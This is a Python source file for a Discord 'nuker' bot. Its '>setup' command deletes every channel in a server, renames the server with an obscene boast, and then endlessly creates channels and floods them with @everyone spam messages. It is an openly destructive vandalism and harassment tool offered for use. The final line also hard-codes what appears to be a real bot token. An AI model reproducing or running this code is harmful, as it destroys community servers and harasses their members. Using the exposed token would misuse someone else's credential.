import discord, os, random
from discord.ext import commands

print("Connecting to nuker...")

prefix = ">"
client = commands.Bot(command_prefix=commands.when_mentioned_or(prefix))
channel_names = ['Fucked By Chupapi!', 'Chupapi Nuked This', 'Chupapi Runs You']

@client.event
async def on_connect():
    print('We have logged in as {0.user}'.format(client))
    print(f"username: {client.user.name}")
    print(f"id: {client.user.id}")
    print(f"prefix: '{prefix}'")
    print('===============================================')
    await client.change_presence(activity=discord.Activity(type=discord.ActivityType.watching, name=f">setup | {len(client.guilds)} servers"))

@client.command(pass_context=True)
async def setup(ctx):
    guild = ctx.message.guild
    await ctx.message.delete()

    for channel in list(ctx.message.guild.channels):
        try:
            await channel.delete()
            print(f"{channel.name} has been deleted...")
        except:
            pass
    
    for i in range(1):
        try:
            await ctx.guild.edit(name="Fucked By Chupapi!")
            print("server name has been changed...")
        except:
            print("server name could not be changed...")

    guild = ctx.guild

    for i in range(1):
        await guild.create_text_channel(random.choice(channel_names))
        await channel.send("@everyone This Server Got Fucked By Chupapi, LOL!")
    while True:
        for channel in guild.text_channels:
            for i in range(500):
                await guild.create_text_channel(random.choice(channel_names))
                await channel.send("@everyone This Server Got Fucked By Chupapi, LOL!")

    #guild = ctx.message.guild
    #await ctx.message.delete()
    #for i in range(2):
        #print("Spammed Channels!")
        #while True:
            #for channel in guild.text_channels:
                #await channel.send("@everyone This Server Got Fucked By Chupapi, LOL!")


client.run("ODM4ODMwNDgxMDcyMDYyNDg0.YJAzww.vpM1V1sZzTaHHLwiiVEKnrilN2Y")